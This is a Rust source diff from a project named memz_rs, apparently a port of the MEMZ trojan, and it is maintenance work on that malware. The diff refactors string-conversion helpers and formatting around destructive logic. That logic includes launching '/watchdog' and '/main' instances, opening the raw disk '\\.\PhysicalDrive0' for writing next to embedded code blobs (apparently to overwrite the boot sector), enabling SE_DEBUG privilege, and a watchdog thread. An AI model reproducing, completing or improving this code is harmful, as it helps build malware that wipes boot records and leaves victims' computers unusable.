@@ -4,7 +4,7 @@ use memz_rs::utils::log;
 use memz_rs::utils::log::*;
 
 use memz_rs::{
-    convert_str::{ToPCSTRWrapper, ToPCWSTRWrapper},
+    convert_str::{ToPCSTR, ToPCWSTR},
     data::{
         self,
         code::{CODE1, CODE1_LEN, CODE2, CODE2_LEN},
@@ -89,7 +89,7 @@ fn main() -> Result<(), WinError> {
                 None,
             ) {
                 Ok(h) => h,
-                Err(e) => panic!("Failed CreateThread\n{e:?}")
+                Err(e) => panic!("Failed CreateThread\n{e:?}"),
             };
         }
 
@@ -175,7 +175,7 @@ fn main() -> Result<(), WinError> {
             wrap_shell_execute_w(
                 HWND(0),
                 PCWSTR::null(),
-                *file_path.as_str().to_pcwstr(),
+                file_path.to_pcwstr(),
                 w!("/watchdog"),
                 PCWSTR::null(),
                 SW_SHOWDEFAULT,
@@ -187,7 +187,7 @@ fn main() -> Result<(), WinError> {
             fMask: SEE_MASK_NOCLOSEPROCESS,
             hwnd: HWND::default(),
             lpVerb: PCWSTR::null(),
-            lpFile: *file_path.as_str().to_pcwstr(),
+            lpFile: file_path.to_pcwstr(),
             lpParameters: w!("/main"),
             lpDirectory: PCWSTR::null(),
             nShow: SW_SHOWDEFAULT.0 as i32,
@@ -223,7 +223,7 @@ fn main() -> Result<(), WinError> {
     }
 
     let drive = wrap_create_file_a(
-        *"\\\\.\\PhysicalDrive0".to_pcstr(),
+        "\\\\.\\PhysicalDrive0".to_pcstr(),
         GENERIC_READ | GENERIC_WRITE,
         FILE_SHARE_READ | FILE_SHARE_WRITE,
         None,
@@ -318,7 +318,7 @@ unsafe extern "system" fn watchdog_thread(_param: *mut c_void) -> u32 {
         write_log(
             LogType::INFO,
             LogLocation::LOG,
-            &format!("{}", dbg!(set_privilege(SE_DEBUG_NAME, true)?)),
+            &format!("{:?}", dbg!(set_privilege(SE_DEBUG_NAME, true))),
         );
     }
     loop {
@@ -393,7 +393,8 @@ unsafe extern "system" fn watchdog_thread(_param: *mut c_void) -> u32 {
                 sleep(Duration::from_millis(500));
             }
             let mut f_buf2: Vec<u8> = vec![MEM_ZEROINIT; 512]; // buf <-- GetProcessImageFilenameA(return char *data)
-            wrap_get_process_image_filename_a(&mut f_buf2).expect("Failed GetProcessImageFilenameA");
+            wrap_get_process_image_filename_a(&mut f_buf2)
+                .expect("Failed GetProcessImageFilenameA");
             #[cfg(feature = "DEBUG_MODE")]
             {
                 let data = format!("f_buf2: {}", std::str::from_utf8(&f_buf2).unwrap());
